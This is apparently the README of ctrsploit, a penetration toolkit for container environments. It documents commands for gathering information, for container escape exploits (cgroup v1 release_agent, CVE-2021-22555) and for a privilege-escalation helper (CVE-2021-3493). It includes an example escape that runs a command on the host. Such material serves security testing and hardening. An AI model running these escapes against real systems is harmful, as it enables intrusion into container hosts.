# ctrsploit: A penetration toolkit for container environment

[中文文档](./README-ZH.md)

ctrsploit [kənˈteɪnər splɔɪt] , follows [sploit-spec](https://github.com/ctrsploit/sploit-spec) v0.4.3

## Why ctrsploit

see [here](https://github.com/ctrsploit/ctrsploit/discussions/11)

## Pre-Built Release

https://github.com/ctrsploit/ctrsploit/releases

## Self Build

### Build in Container

```bash
make binary && ls -lah bin/release
```

### Build in Local

```
make build-ctrsploit
```

## Usage

### Quick-Start

```
wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.5.12/ctrsploit_linux_amd64 && chmod +x ctrsploit
NAME:
   ctrsploit - A penetration toolkit for container environment

               ctrsploit is a command line ... //TODO


USAGE:
   ctrsploit [global options] command [command options] [arguments...]

COMMANDS:
   auto, a      auto gathering information, detect vulnerabilities and run exploits
   env, e       gather information
   exploit, x   run a exploit
   checksec, c  check security inside a container
   helper, he   some helper commands such as local privilege escalation
   version      Show the sploit version information
   help, h      Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug         Output information for helping debugging sploit (default: false)
   --experimental  enable experimental feature (default: false)
   --colorful      output colorfully (default: false)
   --json          output in json format (default: false)
   --help, -h      show help
```

### gather information

usage

```
root@ctr:/# ./ctrsploit env
NAME:
   ctrsploit env - gather information

USAGE:
   ctrsploit env command [command options] [arguments...]

COMMANDS:
   auto              auto
   where, w          detect whether you are in the container, and which type of the container
   graphdriver, g    detect graphdriver type and extend information
   cgroups, c        gather cgroup information
   capability, cap   show the capability of pid 1 and current process
   seccomp, s        show the seccomp info
   apparmor, a       show the apparmor info
   selinux, se       show the selinux info
   fdisk, f          like linux command fdisk or lsblk // TODO
   kernel, k         collect kernel environment information
   namespace, n, ns  check namespace is host ns
   help, h           Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help
```

where

```
root@ctr:/# ./ctrsploit  env  w

===========Container===========
[Y]  Is in Container

===========Docker===========
[Y]  .dockerenv exists
[N]  rootfs contains 'docker'   
[N]  cgroups contains 'docker'
[Y]  the mount source of /etc/hosts contains 'docker'   
[Y]  hostname match regex ^[0-9a-f]12$
---
[Y]  => Is in docker

===========k8s===========
[N]  /var/run/secrets/kubernetes.io exists
[N]  hostname match k8s pattern
[N]  the mount source of /etc/hosts contains 'pods'
[N]  contains 'kubepods'
---
[N]  => is in k8s
```

### run a exploit

```
root@2aa13a052102:/# ./ctrsploit exploit
NAME:
   ctrsploit exploit - run a exploit

USAGE:
   ctrsploit exploit command [command options] [arguments...]

COMMANDS:
   cgroupv1-release_agent, ra                       escape tech by using the notify_on_release of cgroup v1
   cgroupv1-release_agent-unknown_rootfs, ra3       escape tech by using the notify_on_release of cgroup v1 without known rootfs
   help, h                                          Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)

```

eg. : escape by 'cgroupv1-release_agent' tech.

```
root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
root@ctr # wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
```

### check security

Just execute `ctrsploit checksec` or standalone binary file `checksec` in the container.

```
./checksec_linux_amd64 auto
[N]  cap_sys_admin      # Container can be escaped when has cap_sys_admin and use cgroups v1
[N]  host_net_ns        # The network namespace of the host is shared
...
```

## Details

### env

| command                          | alias | description                                                              |
|----------------------------------|-------|--------------------------------------------------------------------------|
| [auto](./env/auto)               |       | auto gather environment information                                      |
| [where](./env/where)             | w     | detect whether you are in the container, and which type of the container |
| [graphdriver](./env/graphdriver) | g     | detect graphdriver type and extend information                           |
| [cgroups](./env/cgroups)         | c     | gather cgroup information                                                |
| [capability](./env/capability)   | cap   | show the capability of pid 1 and current process                         |
| [seccomp](./env/seccomp)         | s     | show the seccomp info                                                    |
| [apparmor](./env/apparmor)       | a     | show the apparmor info                                                   |
| [namespace](./env/namespace)     | n, ns | check namespace is host ns                                               |

### exploit

| exploit                                                                                  | alias | description                                                                  |
|------------------------------------------------------------------------------------------|-------|------------------------------------------------------------------------------|
| [cgroupv1-release_agent](./exploit/cgroupv1-release_agent)                               | ra    | escape tech by using the notify_on_release of cgroup v1                      |
| [cgroupv1-release_agent-unknown_rootfs](./exploit/cgroupv1-release_agent-unknown_rootfs) | ra3   | escape tech by using the notify_on_release of cgroup v1 without known rootfs |
| [cve-2021-22555_ubuntu18.04](./exploit/CVE-2021-22555_ubuntu18.04)                       | 22555 | escape tech by using the CVE-2021-22555 (ubuntu18.04)                        |

### helper

| helper                                  | alias                    | description                    |
|-----------------------------------------|--------------------------|--------------------------------|
| [cve-2021-3493](./helper/cve-2021-3493) | ubuntu-overlayfs-pe,3493 | Ubuntu OverlayFS Local Privesc |

### checksec

Just execute `ctrsploit checksec` or standalone binary file `checksec`.